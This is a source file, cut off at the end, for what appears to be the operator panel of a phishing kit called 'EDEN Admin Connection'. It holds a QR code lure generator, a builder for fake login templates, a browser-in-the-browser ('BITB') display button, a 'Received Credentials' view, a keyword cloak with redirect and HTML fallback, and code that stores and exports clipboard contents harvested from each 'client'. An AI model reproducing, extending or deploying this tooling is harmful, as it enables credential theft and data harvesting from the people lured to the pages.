                        <select id="edenqr-colorMode" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                            <option value="single">Single</option>
                            <option value="linear">Linear Gradient</option>
                        </select>
                        
                        <label class="edenqr-gradient-field" style="font-weight: 600; margin-top: 15px; display: block; color: #708090;">Gradient Type</label>
                        <select id="edenqr-gradientType" class="edenqr-gradient-field" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                            <option value="linear">Linear</option>
                            <option value="radial">Radial</option>
                        </select>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;">
                            <div>
                                <label style="font-weight: 600; display: block; color: #708090;">Primary Color</label>
                                <input type="color" id="edenqr-dotPrimary2" value="#000000" style="width: 100%; padding: 4px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 8px;">
                            </div>
                            <div class="edenqr-gradient-field">
                                <label style="font-weight: 600; display: block; color: #708090;">Secondary Color</label>
                                <input type="color" id="edenqr-dotSecondary" value="#1f2937" style="width: 100%; padding: 4px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 8px;">
                            </div>
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;">
                            <div>
                                <label style="font-weight: 600; display: block; color: #708090;">Background Style</label>
                                <select id="edenqr-backgroundStyle" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                                    <option value="transparent">Transparent</option>
                                    <option value="white">White</option>
                                    <option value="color">Color</option>
                                </select>
                            </div>
                            <div>
                                <label style="font-weight: 600; display: block; color: #708090;">Background Color</label>
                                <input type="color" id="edenqr-backgroundColor" value="#ffffff" style="width: 100%; padding: 4px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 8px;">
                            </div>
                        </div>
                        
                        <label style="font-weight: 600; margin-top: 15px; display: block; color: #708090;">Logo URL</label>
                        <input type="text" id="edenqr-logoUrl" placeholder="https://image.com/logo.png" style="width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #b0c4de; border-radius: 10px; background: #fff; color: #2c3e50;">
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;">
                            <div>
                                <label style="font-weight: 600; display: block; color: #708090;">Logo Size</label>
                                <input type="range" id="edenqr-logoSize" min="0.2" max="0.6" step="0.05" value="0.35" style="width: 100%; margin-top: 6px;">
                            </div>
                            <div>
                                <label style="font-weight: 600; display: block; color: #708090;">Logo Margin</label>
                                <input type="range" id="edenqr-logoMargin" min="0" max="20" step="1" value="8" style="width: 100%; margin-top: 6px;">
                            </div>
                        </div>
                        
                        <label style="margin-top: 15px; display: block; color: #708090;"><input type="checkbox" id="edenqr-hideBgDots" style="margin-right: 8px;"> Hide dots under logo</label>
                        
                        <div style="margin-top: 20px; font-size: 12px; color: #708090;">Detected QR link auto-fills when available.</div>
                        
                        <!-- Divider -->
                        <div style="border-top: 2px solid #e0e0e0; margin: 32px 0 24px 0;"></div>
                        
                        <!-- Keyword System -->
                        <h3 style="margin-top: 0; margin-bottom: 16px; color: #2c3e50; font-weight: 600; font-size: 18px;">Keyword Monitor</h3>
                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 10px;">
                            <input type="text" id="keyword-input" placeholder="Enter keyword" 
                                   style="flex: 1; padding: 10px; border: 1px solid #b0c4de; border-radius: 8px; background: #fff; color: #2c3e50; font-size: 13px;">
                            <button id="keyword-save-btn" class="btn btn-primary" style="padding: 10px 16px; white-space: nowrap; font-size: 13px;">
                                <span id="keyword-save-text">Save</span>
                            </button>
                            <div id="keyword-indicator" style="width: 20px; height: 20px; border-radius: 4px; background: #95a5a6; border: 2px solid #7f8c8d; flex-shrink: 0;" title="Keyword Status"></div>
                        </div>
                        <div style="font-size: 11px; color: #708090; margin-bottom: 4px;">
                            Status: <span id="keyword-status-text">GREY</span>
                        </div>
                        <div style="font-size: 11px; color: #95a5a6; margin-bottom: 20px;">
                            <span style="color: #95a5a6;">●</span> GREY = No keyword | <span style="color: #2ecc71;">●</span> GREEN = Found | <span style="color: #e74c3c;">●</span> RED = Not found
                        </div>
                        
                        <!-- HTML Upload -->
                        <h3 style="margin-top: 0; margin-bottom: 16px; color: #2c3e50; font-weight: 600; font-size: 18px;">HTML Fallback</h3>
                        <div style="margin-bottom: 12px;">
                            <input type="file" id="html-upload-input" accept=".html" multiple style="display: none;">
                            <button id="html-upload-btn" class="btn btn-primary" style="width: 100%; margin-bottom: 12px; font-size: 13px; padding: 10px;">
                                <i class="fas fa-upload"></i> Upload HTML Files
                            </button>
                        </div>
                        <div id="html-files-list" style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 10px; min-height: 80px; max-height: 200px; overflow-y: auto; background: #f8f9fa; font-size: 12px;">
                            <div class="html-files-empty" style="color: #708090; text-align: center; padding: 15px;">No HTML files uploaded</div>
                        </div>
                        
                        <!-- Redirect URL -->
                        <h3 style="margin-top: 24px; margin-bottom: 16px; color: #2c3e50; font-weight: 600; font-size: 18px;">Redirect URL</h3>
                        <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 10px;">
                            <input type="url" id="redirect-url-input" placeholder="https://example.com" 
                                   style="flex: 1; padding: 10px; border: 1px solid #b0c4de; border-radius: 8px; background: #fff; color: #2c3e50; font-size: 13px;">
                            <button id="redirect-save-btn" class="btn btn-primary" style="padding: 10px 16px; white-space: nowrap; font-size: 13px;">
                                Save
                            </button>
                        </div>
                        <div style="font-size: 11px; color: #708090; margin-bottom: 20px;">
                            Used when keyword is RED and no HTML selected
                        </div>
                    </div>
                    
                    <!-- QR Preview Panel -->
                    <div class="edenqr-preview" style="display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #e8f4f8, #f0f8ff); border: 1px solid #b0c4de; border-radius: 18px; box-shadow: inset 0 0 22px rgba(112,128,144,0.1); position: sticky; top: 92px; height: calc(100vh - 200px); min-height: 400px;">
                        <div id="edenqr-container" style="padding: 0; background: #ffffff; border: 1px solid #b0c4de; border-radius: 16px; box-shadow: 0 10px 28px rgba(112,128,144,0.15); display: inline-block; min-width: 300px; min-height: 300px; position: relative;">
                        </div>
                    </div>
                </div>
                <style>
                    .edenqr-sidebar input:focus, .edenqr-sidebar select:focus { border-color: #87ceeb; box-shadow: 0 0 0 3px rgba(135, 206, 235, 0.2); outline: none; }
                    .edenqr-sidebar { overflow-y: auto !important; }
                    #html-files-list .file-item { 
                        display: flex; 
                        align-items: center; 
                        justify-content: space-between; 
                        padding: 8px 10px; 
                        margin-bottom: 6px; 
                        background: #fff; 
                        border: 1px solid #e0e0e0; 
                        border-radius: 6px; 
                    }
                    #html-files-list .file-item.selected { 
                        border: 2px solid #2ecc71; 
                    }
                    #html-files-list button { 
                        font-size: 11px; 
                        padding: 6px 10px; 
                        margin-left: 6px; 
                    }
                    @media (max-width: 900px) { 
                        #edenqr > div { grid-template-columns: 1fr !important; }
                        .edenqr-preview { position: relative !important; height: auto !important; min-height: 400px !important; }
                    }
                </style>
            </div>
            
            <!-- Display Section -->
            <div class="content-section" id="display" style="background: transparent;">
                <div class="upload-section" style="background-color: transparent;">
                    <h2>Upload File</h2>
                    <div class="editor-buttons action-buttons" style="margin-bottom: 1rem; margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                        <button onclick="clearUploadedData()" class="btn primary">Clear Server</button>
                        <button onclick="clearClientData()" class="btn warning">Clean Display</button>
                        <button onclick="uploadToClientStorage()" class="btn success">Upload All</button>
                        <button onclick="clearClientStorage()" class="btn danger">Clear All</button>
                    </div>
                    
                    
                    <div class="drop-zone" id="dropZone">
                        <div class="drop-zone-text">
                            <p>Drag & Drop files here</p>
                            <p>or</p>
                            <label for="fileInput" class="file-input-label">Choose File</label>
                            <input type="file" id="fileInput" class="file-input" accept=".html,.js,.mhtml,.css" hidden multiple>
                        </div>
                    </div>
                    <div class="file-info" id="fileInfo">
                        <p>No file selected</p>
                    </div>

                    <div class="stored-files" id="storedFiles">
                        <h3>Stored Files</h3>
                        <ul id="fileList"></ul>
                    </div>
                </div>
            </div>
            
            <!-- Code Editor Section -->
            <div class="content-section" id="editor">
                <h2>Code Editor</h2>
                <div class="client-selection-info" style="margin-bottom: 10px; font-size: 14px;">
                    <span id="selection-info" style="display:none; color:#2196F3; font-weight:bold;"></span>
                </div>
                
                <!-- Code editor -->
                <textarea id="codeInput" placeholder="Enter your HTML, CSS, and JavaScript code here..."></textarea>
                
                <!-- Action buttons -->
                <div class="editor-buttons action-buttons" style="margin-top: 15px; margin-bottom: 1rem; margin-left: -0.5rem; margin-right: -0.5rem; width: calc(100% + 1rem);">
                    <button id="viewBtn" class="btn primary">Display</button>
                    <button id="BITBBtn" class="btn primary">BITB</button>
                    <button id="executeBtn" class="btn primary">Execute</button>
                    <button id="cleanBtn" class="btn warning">Clean</button>
                </div>
                

                <!-- Credentials Section -->
                <div id="credentialsSection" style="display: none; margin-top: 20px;">
                    <h3>Received Credentials</h3>
                    <div id="credentialsInfo"></div>
                </div>
            </div>
            
            <!-- Blur Section -->
            <div class="content-section" id="blur">
                <h2>Image Blur Tool</h2>
                <div class="blur-section">
                    <div class="upload-area" id="blurUploadArea">
                        <div class="upload-icon">
                            <i class="fas fa-cloud-upload-alt"></i>
                        </div>
                        <h3>Upload Files</h3>
                        <p>Drag & drop your HTML files here or click to select</p>
                        <input type="file" id="blurFileInput" multiple hidden>
                    </div>
                    
                    <div class="effect-settings">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                            <h3 style="margin: 0; color: #34495e; font-weight: 700;">Blur Settings</h3>
                            <div style="display: flex; gap: 10px; align-items: center;">
                                <button id="uploadEffectBtn" class="btn btn-primary btn-small" style="height: 36px; padding-inline: 14px;">
                                    <i class="fas fa-upload"></i> Upload CSS
                                </button>
                                <button id="removeCustomEffectsBtn" class="btn btn-warning btn-small" style="height: 36px; padding-inline: 14px;">
                                    <i class="fas fa-trash-alt"></i> Clean CSS
                                </button>
                                <!-- Hidden input used by Upload CSS button -->
                                <input type="file" id="effectFile" accept=".css" multiple hidden>
                            </div>
                        </div>
                        
                        <div class="blur-controls-grid" style="display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 15px; margin-bottom: 20px; align-items: flex-end;">
                            <div class="control-item">
                                <label style="display: block; font-size: 11px; font-weight: 700; color: #95a5a6; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">Effect Type</label>
                                <select class="effect-selector" id="blurEffectType" style="width: 100%; height: 42px; padding: 0 12px; border-radius: 10px; border: 1px solid #dcdde1; background: #fff; font-size: 14px; color: #2f3640; font-weight: 500;">
                                    <option value="blur">Gaussian Blur</option>
                                    <option value="shade">Shade Effect</option>
                                    <option value="none">No Effect</option>
                                </select>
                            </div>
                            
                            <div class="control-item">
                                <label style="display: block; font-size: 11px; font-weight: 700; color: #95a5a6; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">Location Control</label>
                                <div style="display: flex; gap: 8px;">
                                    <button id="setLocationBtn" class="btn btn-info btn-small" style="flex: 1; height: 40px; border-radius: 8px;">
                                        <i class="fas fa-crosshairs"></i> Set
                                    </button>
                                    <button id="resetLocationBtn" class="btn btn-neutral btn-small" style="flex: 1; height: 40px; border-radius: 8px;">
                                        <i class="fas fa-undo"></i> Reset
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div class="blur-actions-row" style="display: flex; flex-wrap: wrap; gap: 12px; padding: 18px; background: #fdfdfd; border-radius: 12px; border: 1px solid #f1f2f6; margin-bottom: 20px; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);">
                            <button id="sudoDownloadBtn" class="btn btn-success" style="flex: 1; min-width: 140px; height: 44px; border-radius: 10px;">
                                <i class="fas fa-download"></i> Sudo Download
                            </button>
                            <button id="clearBlurBtn" class="btn btn-warning" style="flex: 1; min-width: 100px; height: 44px; border-radius: 10px;">
                                <i class="fas fa-eraser"></i> Clear
                            </button>
                            <button id="cleanAllTemplatesBtn" class="btn btn-danger" style="flex: 1; min-width: 160px; height: 44px; border-radius: 10px;">
                                <i class="fas fa-trash-alt"></i> Clean All Templates
                            </button>
                        </div>
                        
                        <div class="range-control" style="display: flex; flex-direction: column; gap: 6px;">
                            <label>Effect Intensity</label>
                            <div style="display: flex; align-items: center; gap: 10px;">
                                <input type="range" min="1" max="20" value="10" id="blurIntensity" style="flex: 1;">
                                <input type="number" id="blurIntensityCustom" step="0.1" min="0" style="width: 80px; padding: 4px 6px; border-radius: 6px; border: 1px solid #dcdde1; font-size: 13px;" placeholder="10">
                                <div class="range-value" style="min-width: 40px; text-align: right;"><span id="blurIntensityValue">10</span></div>
                            </div>
                        </div>
                    </div>
                    <div class="file-list">
                        <h3>Uploaded Files</h3>
                        <div id="blurFilesContainer" class="files-container"></div>
                    </div>
                    
                    <div class="status-container"></div>
                </div>
            </div>
            


            <!-- Custom Section -->
            <div class="content-section" id="custom">
                <h2>Custom Template</h2>
                <div class="custom-section">
                    <div class="custom-content-container">
                        <!-- Left Side - Form -->
                        <div class="custom-form-container">
                            <h3>Template Details</h3>
                            <div class="form-group">
                                <label>Template Name</label>
                                <input type="text" id="templateName" class="form-control" placeholder="Enter template name">
                            </div>
                            <div class="form-group">
                                <label>Logo Text</label>
                                <input type="text" id="logoText" class="form-control" placeholder="Enter logo text">
                            </div>
                            <div class="form-group">
                                <label>Logo Image URL</label>
                                <input type="url" id="logoUrl" class="form-control" placeholder="Enter logo image URL">
                            </div>
                            <div class="form-group">
                                <label>Container Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="containerColor" value="#ffffff">
                                    <input type="text" id="colorCode" class="form-control" placeholder="Enter hex code" value="#ffffff">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Login Button Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="loginButtonColor" value="#0066ff">
                                    <input type="text" id="buttonColorCode" class="form-control" placeholder="Enter hex code" value="#0066ff">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Text Color</label>
                                <div class="color-picker-container">
                                    <input type="color" id="textColor" value="#333333">
                                    <input type="text" id="textColorCode" class="form-control" placeholder="Enter hex code" value="#333333">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Button Text</label>
                                <input type="text" id="buttonText" class="form-control" placeholder="Sign In" value="Sign In">
                            </div>
                            <div class="form-group">
                                <label>Form Style</label>
                                <select id="formStyle" class="form-control">
                                    <option value="standard">Standard</option>
                                    <option value="rounded">Rounded Corners</option>
                                    <option value="flat">Flat Design</option>
                                    <option value="shadow">Shadow Effect</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Template Size</label>
                                <div class="size-inputs">
                                    <div class="input-group">
                                        <label>Width</label>
                                        <input type="number" id="templateWidth" class="form-control" placeholder="Width" value="400" min="200" max="1200">
                                        <span class="unit">px</span>
                                    </div>
                                    <div class="input-group">
                                        <label>Height</label>
                                        <input type="number" id="templateHeight" class="form-control" placeholder="Height" value="400" min="200" max="1200">
                                        <span class="unit">px</span>
                                        <div class="auto-height">
                                            <input type="checkbox" id="autoHeight" checked>
                                            <label for="autoHeight">Auto height</label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="makeRequiredFields">
                                    <label for="makeRequiredFields">Make all form inputs required</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="addRememberMe">
                                    <label for="addRememberMe">Add "Remember Me" checkbox</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="form-checkbox">
                                    <input type="checkbox" id="addForgotPassword">
                                    <label for="addForgotPassword">Add "Forgot Password" link</label>
                                </div>
                            </div>
                            <div class="form-group">
                                <label>Form Fields</label>
                                <div id="formFieldsContainer">
                                    <div class="field-row">
                                        <div class="field-select">
                                            <select class="form-control">
                                                <option value="username">Username</option>
                                                <option value="email">Email</option>
                                                <option value="password">Password</option>
                                            </select>
                                        </div>
                                        <button class="btn btn-small" id="addFieldBtn">
                                            <i class="fas fa-plus"></i> Add Field
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Right Side - Preview -->
                        <div class="custom-preview-container">
                            <h3>Live Preview</h3>
                            <div id="templatePreview" class="preview-container">
                                <!-- Preview will be generated here -->
                                <div class="template-preview-placeholder">
                                    Preview will appear here as you fill in the details
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Bottom Action Buttons -->
                    <div class="custom-actions">
                        <button id="sendTemplateBtn" class="btn primary">
                            <i class="fas fa-paper-plane"></i> Save to Blur Section
                        </button>
                        <button id="resetTemplateBtn" class="btn secondary">
                            <i class="fas fa-undo"></i> Reset
                        </button>
                    </div>
                </div>
            </div>
            <!-- Footer -->
            <div class="footer">
                <div>© 2025 EDEN Admin Connection. All rights reserved.</div>
                <div>Version 1.0.0</div>
            </div>
        </main>
    </div>
    
    <script>
        // Clipboard History Management
        const clipboardHistory = {
            // Initialize from localStorage or create empty object
            data: (() => {
                try {
                    const stored = localStorage.getItem('clipboardHistory');
                    return stored ? JSON.parse(stored) : {};
                } catch (e) {
                    console.error('Error loading clipboard history:', e);
                    return {};
                }
            })(),
            
            // Add new clipboard entry
            addEntry: function(clientId, content, displayName) {
                if (!clientId || !content) return;
                
                // Initialize client entries if not exists
                if (!this.data[clientId]) {
                    this.data[clientId] = [];
                }
                
                // Store nickname if provided
                if (displayName) {
                    this.data[clientId].displayName = displayName;
                }
                
                // Check if this content already exists for this client to prevent duplicates
                const isDuplicate = this.data[clientId].some(entry => entry.content === content);
                if (isDuplicate) {
                    console.log('Skipping duplicate clipboard content for client', clientId);
                    return;
                }
                
                // Store the last added timestamp to prevent rapid duplicate additions
                if (!this.lastAddedTime) this.lastAddedTime = {};
                const now = Date.now();
                const lastTime = this.lastAddedTime[clientId] || 0;
                
                // If the same client is adding content too quickly (within 2 seconds), skip it
                if (now - lastTime < 2000) {
                    console.log('Skipping too frequent clipboard content from client', clientId);
                    return;
                }
                
                // Update the last added time for this client
                this.lastAddedTime[clientId] = now;
                
                // Add new entry with timestamp at the end to maintain chronological order
                this.data[clientId].push({
                    content: content,
                    timestamp: now
                });
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Delete specific entry
            deleteEntry: function(clientId, index) {
                if (!this.data[clientId] || !this.data[clientId][index]) return;
                
                // Remove entry
                this.data[clientId].splice(index, 1);
                
                // Remove client if no entries left
                if (this.data[clientId].length === 0) {
                    delete this.data[clientId];
                }
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Delete all entries for a client
            deleteClientEntries: function(clientId) {
                if (!this.data[clientId]) return;
                
                // Remove client data
                delete this.data[clientId];
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Clear all history
            clearAll: function() {
                this.data = {};
                this.save();
                this.renderHistory();
            },
            
            // Save to localStorage
            save: function() {
                try {
                    localStorage.setItem('clipboardHistory', JSON.stringify(this.data));
                } catch (e) {
                    console.error('Error saving clipboard history:', e);
                }
            },
            
            // Render clipboard history to UI
            renderHistory: function() {
                const container = document.getElementById('clipboardHistory');
                if (!container) return;
                
                // Clear container
                container.innerHTML = '';
                
                // Check if we have any history
                if (Object.keys(this.data).length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 8px;">
                            <i class="fas fa-clipboard" style="font-size: 2rem; color: #aaa; margin-bottom: 10px;"></i>
                            <p>No clipboard history yet</p>
                        </div>
                    `;
                    return;
                }
                
                // Sort clients by oldest entry first
                const sortedClients = Object.keys(this.data).sort((a, b) => {
                    const aOldest = this.data[a].length > 0 ? 
                        Math.min(...this.data[a].map(entry => entry.timestamp)) : Infinity;
                    const bOldest = this.data[b].length > 0 ? 
                        Math.min(...this.data[b].map(entry => entry.timestamp)) : Infinity;
                    return aOldest - bOldest;
                });
                
                // Create client containers
                sortedClients.forEach(clientId => {
                    // Skip if no entries
                    if (!this.data[clientId] || this.data[clientId].length === 0) return;
                    
                    // Get nickname if available
                    let nickname = clientId;
                    
                    // First check if we have a stored displayName for this client
                    if (this.data[clientId].displayName) {
                        nickname = this.data[clientId].displayName;
                    } 
                    // If not, try to find in clients object
                    else {
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                nickname = clients[key].nickname;
                                break;
                            }
                        }
                        
                        // If still not found, try with shortened ID
                        if (nickname === clientId && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    nickname = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                    }
                    
                    // Create client container
                    const clientContainer = document.createElement('div');
                    clientContainer.className = 'clipboard-client-container';
                    
                    // Create header
                    const header = document.createElement('div');
                    header.className = 'clipboard-client-header';
                    header.innerHTML = `
                        <div>Client: ${nickname}</div>
                        <div>
                            <button class="clipboard-btn" onclick="clipboardHistory.deleteClientEntries('${clientId}')">
                                <i class="fas fa-trash"></i> Clear
                            </button>
                        </div>
                    `;
                    clientContainer.appendChild(header);
                    
                    // Create entries container
                    const entriesContainer = document.createElement('div');
                    entriesContainer.className = 'clipboard-entries';
                    
                    // Add entries in chronological order (oldest first)
                    this.data[clientId].forEach((entry, idx) => {
                        const entryElement = document.createElement('div');
                        entryElement.className = 'clipboard-entry';
                        entryElement.dataset.index = idx;
                        
                        // Format date
                        const date = new Date(entry.timestamp);
                        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                        
                        // Create header
                        const entryHeader = document.createElement('div');
                        entryHeader.className = 'clipboard-entry-header';
                        entryHeader.innerHTML = `
                            <div>
                                <span class="clipboard-entry-number">${idx + 1}</span>
                                <span class="clipboard-entry-time">${formattedDate}</span>
                            </div>
                            <div class="clipboard-entry-actions">
                                <button class="clipboard-btn clipboard-btn-delete" 
                                        onclick="event.stopPropagation(); clipboardHistory.deleteEntry('${clientId}', ${idx})">
                                    <i class="fas fa-times"></i> Delete
                                </button>
                            </div>
                        `;
                        
                        // Toggle content display on click
                        entryHeader.addEventListener('click', function() {
                            entryElement.classList.toggle('expanded');
                        });
                        
                        // Create content
                        const entryContent = document.createElement('div');
                        entryContent.className = 'clipboard-entry-content';
                        entryContent.textContent = entry.content;
                        
                        // Add to entry
                        entryElement.appendChild(entryHeader);
                        entryElement.appendChild(entryContent);
                        
                        // Add to entries container
                        entriesContainer.appendChild(entryElement);
                    });
                    
                    // Add entries to client container
                    clientContainer.appendChild(entriesContainer);
                    
                    // Add to main container
                    container.appendChild(clientContainer);
                });
            }
        };
        
        // Function to clear all clipboard history
        function clearClipboardHistory() {
            if (confirm('Are you sure you want to clear all clipboard history?')) {
                clipboardHistory.clearAll();
            }
        }
        
        // Export clipboard history as PDF
function exportClipboardAsPdf(clipboardData) {
    // We'll need to load the jsPDF library
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
    script.onload = function() {
        const script2 = document.createElement('script');
        script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js';
        script2.onload = generatePDF;
        document.head.appendChild(script2);
    };
    document.head.appendChild(script);
    
    function generatePDF() {
        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // Title
            doc.setFontSize(16);
            doc.text("Eden Clipboard History Export", 14, 15);
            
            // Add timestamp
            const timestamp = new Date().toLocaleString();
            doc.setFontSize(10);
            doc.text(`Generated: ${timestamp}`, 14, 22);
            
            // Loop through each client's clipboard data
            let yPos = 30;
            
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                // Check if we need a new page
                if (yPos > 250) {
                    doc.addPage();
                    yPos = 20;
                }
                
                // Add client header
                doc.setFontSize(12);
                doc.setTextColor(44, 62, 80);
                doc.text(`Client: ${displayName}`, 14, yPos);
                yPos += 10;
                
                // Process each entry
                if (Array.isArray(clientData)) {
                    clientData.forEach((entry, index) => {
                        // Check if we need a new page
                        if (yPos > 270) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            
                            // Add timestamp
                            doc.setFontSize(10);
                            doc.setTextColor(100, 100, 100);
                            doc.text(`${timestamp}:`, 14, yPos);
                            yPos += 5;
                            
                            // Add content
                            doc.setTextColor(0, 0, 0);
                            
                            // Split long content into lines
                            const contentLines = doc.splitTextToSize(entry.content, 180);
                            doc.text(contentLines, 14, yPos);
                            yPos += contentLines.length * 5 + 10;
                            
                            // Add separator
                            doc.setDrawColor(200, 200, 200);
                            doc.line(14, yPos - 5, 196, yPos - 5);
                            yPos += 5;
                        }
                    });
                } else {
                    // Handle case where entries are stored differently
                    const entries = clientData.filter(item => item !== 'displayName');
                    entries.forEach((entry, index) => {
                        // Check if we need a new page
                        if (yPos > 270) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            
                            // Add timestamp
                            doc.setFontSize(10);
                            doc.setTextColor(100, 100, 100);
                            doc.text(`${timestamp}:`, 14, yPos);
                            yPos += 5;
                            
                            // Add content
                            doc.setTextColor(0, 0, 0);
                            
                            // Split long content into lines
                            const contentLines = doc.splitTextToSize(entry.content, 180);
                            doc.text(contentLines, 14, yPos);
                            yPos += contentLines.length * 5 + 10;
                            
                            // Add separator
                            doc.setDrawColor(200, 200, 200);
                            doc.line(14, yPos - 5, 196, yPos - 5);
                            yPos += 5;
                        }
                    });
                }
                
                yPos += 10;
            });
            
            // Save the PDF
            const fileName = `eden_clipboard.pdf`;
            doc.save(fileName);
            
        } catch (error) {
            console.error('Error generating PDF:', error);
            alert('Failed to generate PDF: ' + error.message);
        }
    }
}
        
        // Export clipboard history as HTML
        function exportClipboardAsHtml(clipboardData) {
            const html = generateClipboardHtml(clipboardData);
            const blob = new Blob([html], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.html`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            
        }
        
        // Export clipboard history as TXT
        function exportClipboardAsTxt(clipboardData) {
            let txtContent = "EDEN CLIPBOARD HISTORY\n";
            txtContent += "Generated: " + new Date().toLocaleString() + "\n\n";
            
            // Process each client's clipboard data
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                txtContent += "===================================\n";
                txtContent += `CLIENT: ${displayName}\n`;
                txtContent += "===================================\n\n";
                
                // Process each entry
                if (Array.isArray(clientData)) {
                    clientData.forEach((entry, index) => {
                        const timestamp = new Date(entry.timestamp).toLocaleString();
                        txtContent += `[${timestamp}]\n`;
                        txtContent += "-----------------------------------\n";
                        txtContent += entry.content + "\n\n";
                    });
                } else {
                    // Handle case where entries are stored differently
                    const entries = clientData.filter(item => item !== 'displayName');
                    entries.forEach((entry, index) => {
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            txtContent += `[${timestamp}]\n`;
                            txtContent += "-----------------------------------\n";
                            txtContent += entry.content + "\n\n";
                        }
                    });
                }
                
                txtContent += "\n\n";
            });
            
            const blob = new Blob([txtContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.txt`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            
        }
        
        // Export clipboard history as JSON
        function exportClipboardAsJson(clipboardData) {
            // Create a formatted version of the data
            const exportData = {};
            
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                exportData[clientId] = {
                    displayName: clientData.displayName || clientId,
                    entries: []
                };
                
                // Process entries
                if (Array.isArray(clientData)) {
                    clientData.forEach(entry => {
                        if (entry.timestamp && entry.content) {
                            exportData[clientId].entries.push({
                                content: entry.content,
                                timestamp: entry.timestamp,
                                formattedTimestamp: new Date(entry.timestamp).toLocaleString()
                            });
                        }
                    });
                }
            });
            
            // Create JSON file
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_clipboard.json`;
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            
        }
        
        // Generate HTML for clipboard export
        function generateClipboardHtml(clipboardData) {
            // Create HTML document
            let html = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EDEN Clipboard History Export</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
